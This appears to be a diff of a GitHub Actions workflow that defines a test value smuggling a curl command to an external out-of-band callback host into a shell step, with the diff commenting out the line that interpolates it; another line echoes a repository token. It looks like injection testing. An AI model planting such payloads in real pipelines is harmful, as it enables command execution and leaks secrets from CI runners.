@@ -22,7 +22,7 @@ jobs:
         env:
           TEST_INJECTION: '";{curl,http://2wzlcleq8scnquutjci2434y8peg27qw.oastify.com/hit}|a="'
         run: |
-          plugin_version=$(echo "${{ env.TEST_INJECTION }}" | grep -Eo '[0-9].[0-9]+.[0-9]+')
+          # plugin_version=$(echo "${{ env.TEST_INJECTION }}" | grep -Eo '[0-9].[0-9]+.[0-9]+')
           echo "${{ env.repo-token }}"
 
           
